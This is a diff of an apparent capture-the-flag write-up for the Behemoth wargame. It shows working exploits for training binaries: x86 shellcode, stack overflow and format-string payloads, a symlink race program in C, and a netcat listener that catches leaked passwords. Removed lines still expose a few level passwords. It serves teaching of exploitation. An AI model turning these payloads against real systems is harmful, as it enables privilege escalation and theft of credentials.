@@ -72,7 +72,7 @@ int 0x80
 Edit line 12 by replacing =X= with the correct level number. Then use
 NASM to assemble the shellcode.
 
-#+BEGIN_EXAMPLE
+#+BEGIN_EXAMPLE -n 1
 $ nasm -o shellcode -f bin shellcode.asm
 #+END_EXAMPLE
 
@@ -101,7 +101,7 @@ int main(int argc, char** argv)
 *** Compiling
 To compile this, do the following:
 
-#+BEGIN_EXAMPLE
+#+BEGIN_EXAMPLE -n 1
 $ gcc -m32 -o getenvaddr getenvaddr.c
 #+END_EXAMPLE
 
@@ -109,18 +109,18 @@ $ gcc -m32 -o getenvaddr getenvaddr.c
 
 ** The Vulnerability
 When the program is ran, the user is prompted for a password. The user
-given password is checked against a hardcoded string. This string is
+given password is checked against a hard-coded string. This string is
 the password that causes the program to continue it's normal execution
 and spawns a shell. Line 48 is where a shell owned by behemoth1 would
-be spwaned if the correct password is given.
+be spawned if the correct password is given.
 
-Line 33 is where the string comparsion happens between the given
+Line 33 is where the string comparison happens between the given
 password and the correct password. You can see our input string is
 stored in =$ebp-0x5d= and the correct password is stored in
 =$ebp-1c=. However, it is "encrypted". The function for encrypting and
 decrypting the password is =memfrob=.
 
-#+BEGIN_EXAMPLE -n 1
+#+BEGIN_EXAMPLE -n 1 -n 1
 080485b1 <main>:
  80485b1:       55                      push   ebp
  80485b2:       89 e5                   mov    ebp,esp
@@ -191,7 +191,7 @@ There's some initializing on =$ebp-0x1c= happening at the beginning of
 this, we'll set the breakpoint at =printf= and then do our work. Let's
 check the length of =$ebp-0x1c= and call =memfrob=.
 
-#+BEGIN_EXAMPLE
+#+BEGIN_EXAMPLE -n 1
 $ gdb -q /behemoth/behemoth0
 Reading symbols from /behemoth/behemoth0...(no debugging symbols found)...done.
 (gdb) b printf
@@ -205,7 +205,7 @@ Breakpoint 1, 0xf7e5b7d0 in printf () from /lib32/libc.so.6
 At this point, the the password string is initialized at =$ebp-0x1c=
 but it's encrypted. We can see the encrypted string by doing,
 
-#+BEGIN_EXAMPLE
+#+BEGIN_EXAMPLE -n 1
 (gdb) x/s $ebp-0x1c
 0xffffd6ac:     "OK^GSYBEX^Y"
 #+END_EXAMPLE
@@ -216,7 +216,7 @@ being a pointer to a string and the second being the length of the
 string. Therefore, in order to call =memfrob=, we need the length of
 =$ebp-0x1c=. We can get this by calling =strlen=.
 
-#+BEGIN_EXAMPLE
+#+BEGIN_EXAMPLE -n 1
 (gdb) call strlen($ebp-0x1c)
 $1 = 11
 (gdb) call memfrob($ebp-0x1c, 11)
@@ -233,7 +233,7 @@ Quit anyway? (y or n) y
 
 Now that we have what we think is the password, we can test it.
 
-#+BEGIN_EXAMPLE
+#+BEGIN_EXAMPLE -n 1
 $ /behemoth/behemoth0
 Password: eatmyshorts
 Access granted..
@@ -242,7 +242,7 @@ behemoth1
 $
 #+END_EXAMPLE
 
-Now we have the correct privilages to read
+Now we have the correct privileges to read
 =/etc/behemoth_pass/behemoth1=.
 
 * Level 1
@@ -254,7 +254,7 @@ User input is being written to a buffer on the stack with =gets= that
 is 0x43 (67) bytes long. Therefore, this is vulnerable to over writing
 the return address of =main=.
 
-#+BEGIN_EXAMPLE
+#+BEGIN_EXAMPLE -n 1
 0804844b <main>:
  804844b:       55                      push   ebp
  804844c:       89 e5                   mov    ebp,esp
@@ -278,9 +278,9 @@ the return address of =main=.
 We'll put our shellcode in =$EGG= and overwrite the return address from
 =main= to point to =$EGG=.
 
-#+BEGIN_EXAMPLE
-$ export EGG=$(cat shellcode)
-$ ./getenvaddr EGG /behemoth/behemoth1
+#+BEGIN_EXAMPLE -n 1
+shell> export EGG=$(cat shellcode)
+shell> ./getenvaddr EGG /behemoth/behemoth1
 ffffda2d
 #+END_EXAMPLE
 
@@ -288,12 +288,12 @@ Because the x86 architecture is little endian, we have to put the
 bytes in the correct order. The low-order byte goes first and the
 high-order byte last.
 
-#+BEGIN_EXAMPLE
-$ printf "%s\x2d\xda\xff\xff" $(python -c "print('A' * 71)") | /behemoth/behemoth1
+#+BEGIN_EXAMPLE -n 1
+shell> printf "%s\x2d\xda\xff\xff" $(python -c "print('A' * 71)") | /behemoth/behemoth1
 Password: Authentication failure.
 Sorry.
 XXXXXXXXXX
-$
+shell>
 #+END_EXAMPLE
 
 The shellcode displays the contents of
@@ -397,12 +397,12 @@ need. To accomplish this, we'll make a new directory and give it 777
 permissions. Then we'll make a file called =pass.txt= and give it the
 same permissions.
 
-#+BEGIN_EXAMPLE
-$ mkdir w
-$ chmod 777
-$ cd w
-$ touch pass.txt
-$ chmod 777 pass.txt
+#+BEGIN_EXAMPLE -n 1
+shell> mkdir w
+shell> chmod 777
+shell> cd w
+shell> touch pass.txt
+shell> chmod 777 pass.txt
 #+END_EXAMPLE
 
 This hack will take 33.3 minutes to complete. Because we don't want to
@@ -411,17 +411,17 @@ the background and pipe the output to =pass.txt=. After we start the
 process, we'll know the PID and hence know the filename we need to
 overwrite with a symbolic link.
 
-#+BEGIN_EXAMPLE
-$ behemoth/behemoth2 > pass.txt &
+#+BEGIN_EXAMPLE -n 1
+shell> behemoth/behemoth2 > pass.txt &
 [1] 29355
-$ ln -sf /etc/behemoth_pass/behemoth3 29355
+shell> ln -sf /etc/behemoth_pass/behemoth3 29355
 #+END_EXAMPLE
 
 We can run the following shell script snippet to sound the bell when the
 process has ended.
 
-#+BEGIN_EXAMPLE
-$ while (2>&1 kill -0 29355 | grep permitted > /dev/null); do
+#+BEGIN_EXAMPLE -n 1
+shell> while (2>&1 kill -0 29355 | grep permitted > /dev/null); do
 > echo "Process still running..."
 > sleep 5
 > done; \
@@ -436,13 +436,13 @@ input and that input is passed directly to =printf=. Therefore, a user
 can inject formatting syntax that =printf= understands.
 
 This can be used to overwrite parts of memory using the =%n=
-specificer; which implies we can overwrite a return address, parts of
+specifier; which implies we can overwrite a return address, parts of
 the =.plt= section or something else we choose.
 
-Looking at the dissasembly of =main=, we see =puts= is called at
+Looking at the disassembly of =main=, we see =puts= is called at
 address =0x80484cc=.
 
-#+BEGIN_EXAMPLE
+#+BEGIN_EXAMPLE -n 1
 0804847b <main>:
  804847b:       55                      push   ebp
  804847c:       89 e5                   mov    ebp,esp
@@ -476,23 +476,23 @@ Because the program is calling =puts= from a dynamically loaded
 library, it needs to know how to find the address where =puts=
 resides. This information is supplied by the =.plt= section.
 
- #+BEGIN_EXAMPLE
+ #+BEGIN_EXAMPLE -n 1
  08048350 <puts@plt>:
  8048350:       ff 25 ac 97 04 08       jmp    DWORD PTR ds:0x80497ac
  8048356:       68 10 00 00 00          push   0x10
  804835b:       e9 c0 ff ff ff          jmp    8048320 <.plt>
  #+END_EXAMPLE
 
- We can see from the above diassembly that the pointer to =puts= is
+ We can see from the above disassembly that the pointer to =puts= is
  =0x80497ac=.
  
 ** The Exploit
 
 Let's first prepare our shellcode.
 
-#+BEGIN_EXAMPLE
-$ export EGG=$(cat shellcode)
-$ ./getenvaddr EGG /behemoth/behemoth3
+#+BEGIN_EXAMPLE -n 1
+shell> export EGG=$(cat shellcode)
+shell> ./getenvaddr EGG /behemoth/behemoth3
 ffffde2d
 #+END_EXAMPLE
 
@@ -517,8 +517,8 @@ bytes.
 
 The final result looks like this:
 
-#+BEGIN_EXAMPLE
-$ printf '\xac\x97\x04\x08\xae\x97\x04\x08%%56869c%%1$n%%8658c%%2$n' | /behemoth/behemoth3
+#+BEGIN_EXAMPLE -n 1
+shell> printf '\xac\x97\x04\x08\xae\x97\x04\x08%%56869c%%1$n%%8658c%%2$n' | /behemoth/behemoth3
 
 XXXXXXXXXX
 #+END_EXAMPLE
@@ -527,66 +527,221 @@ XXXXXXXXXX
 
 ** The Vulnerability
 
+This level is very similar to level 2. The program is trying to open a
+file that's named after it's PID. Then it prints out the file
+contents. We can see in the beginning of =main=, =getpid= is called
+(at 0x804858c) and the result is stored in =$ebp-0xc=. Soon after, the
+value is used in =sprintf= to create some new string. You can quickly
+see that the format string for =sprintf= is ="/tmp/%d"=.
+
+#+BEGIN_EXAMPLE -n 1
+0804857b <main>:
+ 804857b:       8d 4c 24 04             lea    ecx,[esp+0x4]
+ 804857f:       83 e4 f0                and    esp,0xfffffff0
+ 8048582:       ff 71 fc                push   DWORD PTR [ecx-0x4]
+ 8048585:       55                      push   ebp
+ 8048586:       89 e5                   mov    ebp,esp
+ 8048588:       51                      push   ecx
+ 8048589:       83 ec 24                sub    esp,0x24
+ 804858c:       e8 6f fe ff ff          call   8048400 <getpid@plt>
+ 8048591:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
+ 8048594:       83 ec 04                sub    esp,0x4
+ 8048597:       ff 75 f4                push   DWORD PTR [ebp-0xc]
+ 804859a:       68 c0 86 04 08          push   0x80486c0
+ 804859f:       8d 45 d8                lea    eax,[ebp-0x28]
+ 80485a2:       50                      push   eax
+ 80485a3:       e8 b8 fe ff ff          call   8048460 <sprintf@plt>
+ 80485a8:       83 c4 10                add    esp,0x10
+ 80485ab:       83 ec 08                sub    esp,0x8
+ 80485ae:       68 c8 86 04 08          push   0x80486c8
+ 80485b3:       8d 45 d8                lea    eax,[ebp-0x28]
+ 80485b6:       50                      push   eax
+ 80485b7:       e8 74 fe ff ff          call   8048430 <fopen@plt>
+ #+END_EXAMPLE
+ 
+ Then there's some yada-yada (that's a technical term) and the content
+ is read and spit out.
+ 
+ #+BEGIN_EXAMPLE -n 1
+ 80485bc:       83 c4 10                add    esp,0x10
+ 80485bf:       89 45 f0                mov    DWORD PTR [ebp-0x10],eax
+ 80485c2:       83 7d f0 00             cmp    DWORD PTR [ebp-0x10],0x0
+ 80485c6:       75 12                   jne    80485da <main+0x5f>
+ 80485c8:       83 ec 0c                sub    esp,0xc
+ 80485cb:       68 ca 86 04 08          push   0x80486ca
+ 80485d0:       e8 3b fe ff ff          call   8048410 <puts@plt>
+ 80485d5:       83 c4 10                add    esp,0x10
+ 80485d8:       eb 52                   jmp    804862c <main+0xb1>
+ 80485da:       83 ec 0c                sub    esp,0xc
+ 80485dd:       6a 01                   push   0x1
+ 80485df:       e8 0c fe ff ff          call   80483f0 <sleep@plt>
+ 80485e4:       83 c4 10                add    esp,0x10
+ 80485e7:       83 ec 0c                sub    esp,0xc
+ 80485ea:       68 d9 86 04 08          push   0x80486d9
+ 80485ef:       e8 1c fe ff ff          call   8048410 <puts@plt>
+ 80485f4:       83 c4 10                add    esp,0x10
+ 80485f7:       eb 0e                   jmp    8048607 <main+0x8c>
+ 80485f9:       83 ec 0c                sub    esp,0xc
+ 80485fc:       ff 75 ec                push   DWORD PTR [ebp-0x14]
+ 80485ff:       e8 3c fe ff ff          call   8048440 <putchar@plt>
+ 8048604:       83 c4 10                add    esp,0x10
+ 8048607:       83 ec 0c                sub    esp,0xc
+ 804860a:       ff 75 f0                push   DWORD PTR [ebp-0x10]
+ 804860d:       e8 3e fe ff ff          call   8048450 <fgetc@plt>
+ 8048612:       83 c4 10                add    esp,0x10
+ 8048615:       89 45 ec                mov    DWORD PTR [ebp-0x14],eax
+ 8048618:       83 7d ec ff             cmp    DWORD PTR [ebp-0x14],0xffffffff
+ 804861c:       75 db                   jne    80485f9 <main+0x7e>
+ 804861e:       83 ec 0c                sub    esp,0xc
+ 8048621:       ff 75 f0                push   DWORD PTR [ebp-0x10]
+ 8048624:       e8 b7 fd ff ff          call   80483e0 <fclose@plt>
+ 8048629:       83 c4 10                add    esp,0x10
+ 804862c:       b8 00 00 00 00          mov    eax,0x0
+ 8048631:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
+ 8048634:       c9                      leave
+ 8048635:       8d 61 fc                lea    esp,[ecx-0x4]
+ 8048638:       c3                      ret
+#+END_EXAMPLE
+
+Thus, if we know the PID we can create a symbolic link in =/tmp/= that
+points to =/etc/behemoth_pass/behemoth5=.
+
 ** The Exploit
 
-#+BEGIN_SRC
-#include <stdio.h>
-#include <unistd.h>
+The exploit is fairly straight forward. We'll implement a wrapper that
+forks to capture the PID. The parent process will create the symlink
+and the child will execute =/behemoth/behemoth4=.
 
-int main() {
+#+BEGIN_SRC c
+  #include <stdio.h>
+  #include <unistd.h>
+
+  int main() {
     int pid = fork();
     char file[] = "/tmp/XXXXXXXXXXXXXXXX";
 
     if (pid == 0) {
-        printf("Child is sleeping...\n");
-        sleep(5);
-        printf("Child woke up!\n");
-        printf("Executing behemoth4");
-        execl("/behemoth/behemoth4", "behemoth4", NULL);
+      printf("Child is sleeping...\n");
+      sleep(5);
+      printf("Child woke up!\n");
+      printf("Executing behemoth4");
+      execl("/behemoth/behemoth4", "behemoth4", NULL);
     } else {
-        sprintf(file + sizeof("/tmp/") - 1, "%d", pid);
-        printf("Making symlink: %s -> /etc/behemoth_pass/behemoth5\n", file);
-        symlink("/etc/behemoth_pass/behemoth5", file);
+      sprintf(file + sizeof("/tmp/") - 1, "%d", pid);
+      printf("Making symlink: %s -> /etc/behemoth_pass/behemoth5\n", file);
+      symlink("/etc/behemoth_pass/behemoth5", file);
     }
 
     return 0;
-}
+  }
 #+END_SRC
+
+We'll save this code =exploit.c= and compile it.
+
+#+BEGIN_EXAMPLE -n 1
+shell> gcc -o exploit exploit.c
+shell> ./exploit > pass.txt
+#+END_EXAMPLE
+
+Wait for 5 seconds and then,
+
+#+BEGIN_EXAMPLE -n 1
+shell> cat pass.txt
+Making symlink: /tmp/16830 -> /etc/behemoth_pass/behemoth5
+Finished sleeping, fgetcing
+XXXXXXXXXX
+#+END_EXAMPLE
 
 * Level 5
 ** The Vulnerability
+I'm not going to post the entire disassembly because it's long and we
+don't need to reference most of it.
+
+Immediately, the program is opening a file which happens to be the
+password file we want to read, =/etc/behemoth_pass/behemoth6=. The
+strings =0x80489a0= and =0x80489a2= are ="r"= and
+=/etc/behemoth_pass/behemoth6= respectively.
+
+#+BEGIN_EXAMPLE -n 1
+0804872b <main>:
+ 804872b:       8d 4c 24 04             lea    ecx,[esp+0x4]
+ 804872f:       83 e4 f0                and    esp,0xfffffff0
+ 8048732:       ff 71 fc                push   DWORD PTR [ecx-0x4]
+ 8048735:       55                      push   ebp
+ 8048736:       89 e5                   mov    ebp,esp
+ 8048738:       51                      push   ecx
+ 8048739:       83 ec 34                sub    esp,0x34
+ 804873c:       c7 45 f4 00 00 00 00    mov    DWORD PTR [ebp-0xc],0x0
+ 8048743:       83 ec 08                sub    esp,0x8
+ 8048746:       68 a0 89 04 08          push   0x80489a0
+ 804874b:       68 a2 89 04 08          push   0x80489a2
+ 8048750:       e8 5b fe ff ff          call   80485b0 <fopen@plt>
+ #+END_EXAMPLE
+
+ So the question is, what is the program going to do with the file?
+ The answer is read the contents and write those contents to a
+ socket. Therefore, we need to know the socket type (such as TCP, UDP,
+ or UNIX). In addition to this we need to know either the port or
+ filename of the socket.
+
+ We can see that it's a connection-less socket over IP.  The =0x2= at
+ 0x8048834 refers to =SOCK_DGRAM= and the =0x2= at 0x8048836 refers to
+ =PF_INET=. Therefore, it's a UDP socket.
+ 
+ #+BEGIN_EXAMPLE -n 1
+ 8048832:       6a 00                   push   0x0
+ 8048834:       6a 02                   push   0x2
+ 8048836:       6a 02                   push   0x2
+ 8048838:       e8 b3 fd ff ff          call   80485f0 <socket@plt>
+ #+END_EXAMPLE
+
+ The port number can be found here which ends up being 1337.
+ 
+ #+BEGIN_EXAMPLE -n 1
+ 804886c:       68 e4 89 04 08          push   0x80489e4
+ 8048871:       e8 6a fd ff ff          call   80485e0 <atoi@plt>
+ #+END_EXAMPLE
 
 ** The Exploit
 
-#+BEGIN_EXAMPLE
-behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ nc -u -l -p 1337 > pass &
-[2] 3099
-behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ /behemoth/behemoth5
-behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ ls
-pass
-behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ cat pass
-mayiroeche
+This will be extremely easy. We'll use netcat to listen on a UDP
+socket using port 1337.
 
-[2]+  Stopped                 nc -u -l -p 1337 > pass
-behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$
-behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$
+#+BEGIN_EXAMPLE -n 1
+shell> nc -u -l -p 1337 > pass.txt &
+[2] 18669
+shell> /behemoth/behemoth5
+shell> cat pass.txt
+XXXXXXXXXX
 #+END_EXAMPLE
 
 * Level 6
 
 ** The Vulnerability
 
+Level 6 consists of two executables, =/behemoth/behemoth6= and
+=/behemoth/behemoth6_reader=. The former executes =behemoth6_reader=
+with =popen= and reads it's output. If the output matches
+"HelloKitty", it spawns a shell owned behemoth7.
+
+Therefore, to solve this level, we need to force =behemoth6_reader= to
+print out "HelloKitty". If we look at what =behemoth6_reader= does, it
+reads the contents of a filename "shellcode.txt" into memory and then
+calls it as a function. However, if "shellcode.txt" has a 0xb byte, it
+fails.
+
+There are so many ways this can be exploited.
+
 ** The Exploit
+One solution is to write some shellcode that prints out
+"HelloKitty". The following shellcode accomplishes this:
 
 #+NAME: shellcode6.asm
 #+BEGIN_SRC asm -n 1
 BITS 32
-
 %define PUTS [0x804a020]
-
 push ebp
 mov ebp,esp
-
 xor eax, eax
 push eax
 push "itty"
@@ -596,31 +751,251 @@ inc esp
 inc esp
 push esp
 call PUTS
-
 mov esp, ebp
 pop ebp
 ret
 #+END_SRC
 
-#+BEGIN_EXAMPLE
-behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX$ mkdir w
-behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX$ chmod 777 w
-behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX$ cd w
-behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX/w$ nasm -o shellcode.txt ../shellcode.asm
-behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX/w$ /behemoth/behemoth6
+We need to make a directory that the user behemoth7 can access.
+
+#+BEGIN_EXAMPLE -n 1
+shell> mkdir w
+shell> chmod 777 w
+shell> cd w
+#+END_EXAMPLE
+
+Now let's assemble our shellcode and run =behemoth6=.
+
+#+BEGIN_EXAMPLE -n 1
+shell> nasm -o shellcode.txt ../shellcode6.asm
+shell> /behemoth/behemoth6
 Correct.
-$ cat /etc/behemoth_pass/behemoth7
-baquoxuafo
-$
+shell> whoami
+behemoth7
+shell> cat /etc/behemoth_pass/behemoth7
+XXXXXXXXXX
+shell>
+#+END_EXAMPLE
+
+*** Alternative Exploit
+
+Just to make the point that there's more than one solution to these
+levels, I'll provide another method. The shellcode is running as
+behemoth7. Therefore we can directly access files owned by behemoth7
+from the shellcode.
+
+Instead of having our shellcode print out "HelloKitty", we can just
+copy the contents of =/etc/behemoth_pass/behemoth7= to a file
+behemoth6 can read.
+
+Here's shellcode that avoids the byte 0xb and executes a file named
+=X= in the local directory.
+
+#+NAME: shellcode6.1.asm
+#+BEGIN_SRC asm -n 1
+          BITS 32
+
+          xor eax, eax    ; Our null byte
+          push eax
+          mov ecx, esp    ; Array of {NULL}
+          mov edx, esp    ; Array of {NULL}
+          push ".//X"
+          mov ebx, esp
+          inc al
+          add al, 10      ; Avoid 0xb
+          int 0x80
+#+END_SRC
+
+Let's write a C program called =X.c= that will copy the password out
+of =/etc/behemoth_pass/behemoth7= and into =pass.txt=.
+
+#+NAME: X.c
+#+BEGIN_SRC c
+  #include <stdio.h>
+
+  int main(int argc, char** argv)
+  {
+    const char* file = "/etc/behemoth_pass/behemoth7";
+    FILE* out = fopen("pass.txt", "w");
+
+    if (!out)
+      return -1;
+
+    FILE* in  = fopen(file, "r");
+    if (!in) {
+      fprintf(out, "Failed to open %s", file);
+      fclose(out);
+      return -1;
+    }
+
+    int c;
+    while ((c = fgetc(in)) != EOF)
+      fprintf(out, "%c", c);
+
+    fclose(out);
+    fclose(in);
+    return 0;
+  }
+#+END_SRC
+
+Now we'll assembly, compile, and run.
+
+#+BEGIN_EXAMPLE -n 1
+shell> mkdir w
+shell> chmod 777 w
+shell> cd w
+shell> touch pass.txt
+shell> chmod 777 pass.txt
+shell> nasm -o shellcode.txt -f bin shellcode6.1.asm
+shell> gcc -m32 -o X X.c
+shell> /behemoth/behemoth6
+Incorrect output.
+shell> cat pass.txt
+XXXXXXXXXX
 #+END_EXAMPLE
 
 * Level 7
 
 ** The Vulnerability
 
+This level uses the vulnerable =strcpy= function. But it tries to
+protect against us running shellcode by zeroing the memory that holds
+all the environment variables. It also checks =argv[1]= for
+non-alphanumeric characters. If such as characters is found, it exists
+before reaching =strcpy=.
+
+Notice I said =argv[1]= is checked. It never checks =argv[2]= and
+beyond. Therefore, we can inject our shellcode there. The buffer size
+that =argv[1]= is copied into is 524 bytes.
+
+#+BEGIN_EXAMPLE -n 1
+0804852b <main>:
+ 804852b:       55                      push   ebp
+ 804852c:       89 e5                   mov    ebp,esp
+ 804852e:       81 ec 0c 02 00 00       sub    esp,0x20c
+ 8048534:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
+ 8048537:       8b 40 04                mov    eax,DWORD PTR [eax+0x4]
+ 804853a:       89 45 fc                mov    DWORD PTR [ebp-0x4],eax
+ 804853d:       c7 45 f8 00 00 00 00    mov    DWORD PTR [ebp-0x8],0x0
+ 8048544:       eb 3d                   jmp    8048583 <main+0x58>
+ 8048546:       8b 45 f8                mov    eax,DWORD PTR [ebp-0x8]
+ 8048549:       8d 14 85 00 00 00 00    lea    edx,[eax*4+0x0]
+ 8048550:       8b 45 10                mov    eax,DWORD PTR [ebp+0x10]
+ 8048553:       01 d0                   add    eax,edx
+ 8048555:       8b 00                   mov    eax,DWORD PTR [eax]
+ 8048557:       50                      push   eax
+ 8048558:       e8 73 fe ff ff          call   80483d0 <strlen@plt>
+ 804855d:       83 c4 04                add    esp,0x4
+ 8048560:       89 c2                   mov    edx,eax
+ 8048562:       8b 45 f8                mov    eax,DWORD PTR [ebp-0x8]
+ 8048565:       8d 0c 85 00 00 00 00    lea    ecx,[eax*4+0x0]
+ 804856c:       8b 45 10                mov    eax,DWORD PTR [ebp+0x10]
+ 804856f:       01 c8                   add    eax,ecx
+ 8048571:       8b 00                   mov    eax,DWORD PTR [eax]
+ 8048573:       52                      push   edx
+ 8048574:       6a 00                   push   0x0
+ 8048576:       50                      push   eax
+ 8048577:       e8 84 fe ff ff          call   8048400 <memset@plt>
+ 804857c:       83 c4 0c                add    esp,0xc
+ 804857f:       83 45 f8 01             add    DWORD PTR [ebp-0x8],0x1
+ 8048583:       8b 45 f8                mov    eax,DWORD PTR [ebp-0x8]
+ 8048586:       8d 14 85 00 00 00 00    lea    edx,[eax*4+0x0]
+ 804858d:       8b 45 10                mov    eax,DWORD PTR [ebp+0x10]
+ 8048590:       01 d0                   add    eax,edx
+ 8048592:       8b 00                   mov    eax,DWORD PTR [eax]
+ 8048594:       85 c0                   test   eax,eax
+ 8048596:       75 ae                   jne    8048546 <main+0x1b>
+ 8048598:       c7 45 f4 00 00 00 00    mov    DWORD PTR [ebp-0xc],0x0
+ 804859f:       83 7d 08 01             cmp    DWORD PTR [ebp+0x8],0x1
+ 80485a3:       0f 8e 9a 00 00 00       jle    8048643 <main+0x118>
+ 80485a9:       eb 6d                   jmp    8048618 <main+0xed>
+ 80485ab:       83 45 f4 01             add    DWORD PTR [ebp-0xc],0x1
+ 80485af:       e8 5c fe ff ff          call   8048410 <__ctype_b_loc@plt>
+ 80485b4:       8b 10                   mov    edx,DWORD PTR [eax]
+ 80485b6:       8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]
+ 80485b9:       0f b6 00                movzx  eax,BYTE PTR [eax]
+ 80485bc:       0f be c0                movsx  eax,al
+ 80485bf:       01 c0                   add    eax,eax
+ 80485c1:       01 d0                   add    eax,edx
+ 80485c3:       0f b7 00                movzx  eax,WORD PTR [eax]
+ 80485c6:       0f b7 c0                movzx  eax,ax
+ 80485c9:       25 00 04 00 00          and    eax,0x400
+ 80485ce:       85 c0                   test   eax,eax
+ 80485d0:       75 42                   jne    8048614 <main+0xe9>
+ 80485d2:       e8 39 fe ff ff          call   8048410 <__ctype_b_loc@plt>
+ 80485d7:       8b 10                   mov    edx,DWORD PTR [eax]
+ 80485d9:       8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]
+ 80485dc:       0f b6 00                movzx  eax,BYTE PTR [eax]
+ 80485df:       0f be c0                movsx  eax,al
+ 80485e2:       01 c0                   add    eax,eax
+ 80485e4:       01 d0                   add    eax,edx
+ 80485e6:       0f b7 00                movzx  eax,WORD PTR [eax]
+ 80485e9:       0f b7 c0                movzx  eax,ax
+ 80485ec:       25 00 08 00 00          and    eax,0x800
+ 80485f1:       85 c0                   test   eax,eax
+ 80485f3:       75 1f                   jne    8048614 <main+0xe9>
+ 80485f5:       a1 40 99 04 08          mov    eax,ds:0x8049940
+ 80485fa:       68 d0 86 04 08          push   0x80486d0
+ 80485ff:       68 d8 86 04 08          push   0x80486d8
+ 8048604:       50                      push   eax
+ 8048605:       e8 e6 fd ff ff          call   80483f0 <fprintf@plt>
+ 804860a:       83 c4 0c                add    esp,0xc
+ 804860d:       6a 01                   push   0x1
+ 804860f:       e8 ac fd ff ff          call   80483c0 <exit@plt>
+ 8048614:       83 45 fc 01             add    DWORD PTR [ebp-0x4],0x1
+ 8048618:       8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]
+ 804861b:       0f b6 00                movzx  eax,BYTE PTR [eax]
+ 804861e:       84 c0                   test   al,al
+ 8048620:       74 09                   je     804862b <main+0x100>
+ 8048622:       81 7d f4 ff 01 00 00    cmp    DWORD PTR [ebp-0xc],0x1ff
+ 8048629:       7e 80                   jle    80485ab <main+0x80>
+ 804862b:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
+ 804862e:       83 c0 04                add    eax,0x4
+ 8048631:       8b 00                   mov    eax,DWORD PTR [eax]
+ 8048633:       50                      push   eax
+ 8048634:       8d 85 f4 fd ff ff       lea    eax,[ebp-0x20c]
+ 804863a:       50                      push   eax
+ 804863b:       e8 70 fd ff ff          call   80483b0 <strcpy@plt>
+ 8048640:       83 c4 08                add    esp,0x8
+ 8048643:       b8 00 00 00 00          mov    eax,0x0
+ 8048648:       c9                      leave
+ 8048649:       c3                      ret
+#+END_EXAMPLE
+
 ** The Exploit
 
-#+BEGIN_EXAMPLE
-$ $(python3 -c 'print("A" * 528, end="")'; printf "\xe0\xd4\xff\xff") $(cat shellcode.bin)
+After we assemble our shellcode, we're going to use a nop sled to make
+life easier.
+
+#+BEGIN_EXAMPLE -n 1
+shell> nasm -f bin -o shellcode.bin shellcode.asm
+shell> python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"* 1024)' > sled.bin
+shell> cat sled.bin shellcode.bin > shellcode
+#+END_EXAMPLE
+
+Now we need the memory address of =argv[2]=.
+
+#+BEGIN_EXAMPLE -n 1
+(gdb) b main
+Breakpoint 1 at 0x8048534
+(gdb) r $(python3 -c 'print("A" * 528, end="")') $(cat shellcode)
+Starting program: /behemoth/behemoth7 $(python3 -c 'print("A" * 528, end="")') $(cat shellcode)
+
+Breakpoint 1, 0x08048534 in main ()
+(gdb) x/4wx $ebp
+0xffffcf48:     0x00000000      0xf7e2a286      0x00000003      0xffffcfe4
+(gdb) x/3wx 0xffffcfe4
+0xffffcfe4:     0xffffd142      0xffffd156      0xffffd367
+(gdb) x/s 0xffffd156
+0xffffd156:     'A' <repeats 200 times>...
+(gdb)
+#+END_EXAMPLE
+
+=0xffffd367= is the address of our shellcode. Because we have a nop
+sled, I'm just going to estimate it as =0xffffd401=.
+
+#+BEGIN_EXAMPLE -n 1
+shell> /behemoth/behemoth7 $(python3 -c 'print("A" * 528, end="")'; printf "\x01\xd4\xff\xff") $(cat shellcode)
+XXXXXXXXXX
 #+END_EXAMPLE
 
